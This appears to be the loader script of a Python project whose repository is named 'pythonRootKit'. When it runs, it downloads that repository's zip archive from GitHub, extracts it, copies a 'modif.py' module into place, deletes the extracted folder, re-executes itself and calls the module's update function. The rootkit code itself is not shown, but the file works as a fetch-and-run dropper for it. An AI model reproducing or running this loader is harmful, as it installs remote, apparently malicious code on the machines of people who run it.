from fileinput import filename
import requests, zipfile, os, shutil, time
data = "https://github.com/N0SAFE/pythonRootKit/archive/main.zip"

def getpath(change=False):
    if change in (False, "not", "\\"):
        return os.getcwd()
    else: return os.getcwd().replace('\\', '/')
def getFileName():
    return os.path.basename(__file__)
def getNameDir(data):
    return (data.split("/")[len(data.split("/"))-3])+"-"+(((data.split("/")[len(data.split("/"))-1]).split("."))[0])

def supDir(data):
    shutil.rmtree(data)
    
def downloadFileGithub(file_url, data=".zip"):
    with open(data,"wb") as zip	: 
        for chunk in (requests.get(file_url, stream = True)).iter_content(chunk_size=1024): 
             # writing one chunk at a time to zip file 
             if chunk: zip.write(chunk)
    unzipfile()
    
def unzipfile(file=".zip"):
    # ouvrir le fichier zip en mode lecture
    with zipfile.ZipFile(file, 'r') as zip: 
        # extraire tous les fichiers
        zip.extractall() 
    os.remove(file)

def sortNameFile(data):
    from os.path import isfile, join
    return [f for f in os.listdir(data) if isfile(join(data, f))]
    
def moveFileFromDir(data):
    fichiers = []
    fichiers.append("modif.py")
    for f in range(len(fichiers)):
        if fichiers[f] != getFileName():
            shutil.copy(getpath(True)+"/"+data+"/"+fichiers[f], getpath(True))

try: import modif
except:
    dir = getNameDir(data)
    downloadFileGithub(data)
    moveFileFromDir(dir)
    supDir(dir)
    os.system(getFileName())

modif.update(data, delete=True)
